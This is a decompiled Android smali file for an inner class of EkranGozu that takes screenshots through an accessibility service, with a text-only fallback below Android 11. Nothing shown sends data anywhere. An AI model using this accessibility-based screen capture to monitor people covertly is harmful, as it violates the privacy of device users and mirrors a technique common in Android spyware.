.class Lcom/dogac/bin1/EkranGozu$6;
.super Ljava/lang/Object;
.source "EkranGozu.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/dogac/bin1/EkranGozu;->yakala()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic val$bilgi:[Ljava/lang/String;

.field final synthetic val$s:Lcom/dogac/bin1/CarvisErisim;


# direct methods
.method constructor <init>(Lcom/dogac/bin1/CarvisErisim;[Ljava/lang/String;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 165
    iput-object p1, p0, Lcom/dogac/bin1/EkranGozu$6;->val$s:Lcom/dogac/bin1/CarvisErisim;

    iput-object p2, p0, Lcom/dogac/bin1/EkranGozu$6;->val$bilgi:[Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .line 166
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    const/4 v2, 0x0

    if-lt v0, v1, :cond_0

    .line 168
    :try_start_0
    iget-object v0, p0, Lcom/dogac/bin1/EkranGozu$6;->val$s:Lcom/dogac/bin1/CarvisErisim;

    invoke-virtual {v0}, Lcom/dogac/bin1/CarvisErisim;->getMainExecutor()Ljava/util/concurrent/Executor;

    move-result-object v1

    new-instance v3, Lcom/dogac/bin1/EkranGozu$6$1;

    invoke-direct {v3, p0}, Lcom/dogac/bin1/EkranGozu$6$1;-><init>(Lcom/dogac/bin1/EkranGozu$6;)V

    const/4 v4, 0x0

    invoke-virtual {v0, v4, v1, v3}, Lcom/dogac/bin1/CarvisErisim;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    .line 183
    iget-object v1, p0, Lcom/dogac/bin1/EkranGozu$6;->val$s:Lcom/dogac/bin1/CarvisErisim;

    iget-object v3, p0, Lcom/dogac/bin1/EkranGozu$6;->val$bilgi:[Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v3, v2, v0}, Lcom/dogac/bin1/EkranGozu;->bitir(Landroid/content/Context;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 184
    :cond_0
    iget-object v0, p0, Lcom/dogac/bin1/EkranGozu$6;->val$s:Lcom/dogac/bin1/CarvisErisim;

    iget-object v1, p0, Lcom/dogac/bin1/EkranGozu$6;->val$bilgi:[Ljava/lang/String;

    const-string v3, "Android 11 alt\u0131: yaln\u0131z yaz\u0131lar"

    invoke-static {v0, v1, v2, v3}, Lcom/dogac/bin1/EkranGozu;->bitir(Landroid/content/Context;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    return-void
.end method
